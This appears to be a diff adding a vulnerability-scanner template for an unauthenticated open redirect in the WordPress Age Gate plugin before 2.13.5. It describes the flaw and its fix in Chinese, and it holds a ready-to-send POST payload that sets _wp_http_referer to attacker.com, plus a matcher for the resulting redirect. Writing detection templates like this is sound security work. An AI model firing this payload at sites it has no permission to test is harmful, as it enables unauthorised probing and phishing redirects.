@@ -1,0 +1,42 @@
+id: age-gate-open-redirect
+info:
+  name: Age Gate < 2.13.5 - Unauthenticated Open Redirect
+  author:
+  - l0ne1y
+  tags:
+  - wp-plugin
+  - redirect
+  - wordpress
+  - wp
+  - agegate
+  - unauth
+  description: |-
+    Wordpress Plugin  age-gate < 2.13.5 - 未经身份验证的URL重定向漏洞
+    该插件采用 _wp_http_referer 参数在某些操作后以及在无效或丢失随机数后重定向用户，从而导致未验证的打开重定向问题。
+  reference:
+  - https://wpscan.com/vulnerability/10489
+  - https://packetstormsecurity.com/files/160236/
+  - https://wordpress.org/plugins/age-gate
+  severity: low
+  metadata:
+    verified: true
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：https://wordpress.com/zh-cn/install-plugins/
+
+    临时修复方案：
+    1、代码固定跳转地址，不让用户控制变量。
+    2、跳转目标地址采用白名单映射机制、只对合法的 URL 做跳转。
+    3、合理充分的校验校验跳转的目标地址，非己方地址时告知用户跳转风险。
+requests:
+- matchers:
+  - type: regex
+    part: header
+    regex:
+    - (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)attacker\.com\/?(\/|[^.].*)?$
+  path:
+  - '{{BaseURL}}/wp-admin/admin-post.php'
+  method: POST
+  body: age_gate%5Bd%5D=10&age_gate%5Bm%5D=10&age_gate%5By%5D=1990&age_gate%5Bremember%5D=1&age_gate%5Bage%5D=TVRnPQ%3D%3D&action=age_gate_submit&age_gate%5Bnonce%5D=48f2b89fed&_wp_http_referer=https://attacker.com
+  headers:
+    Content-Type: application/x-www-form-urlencoded
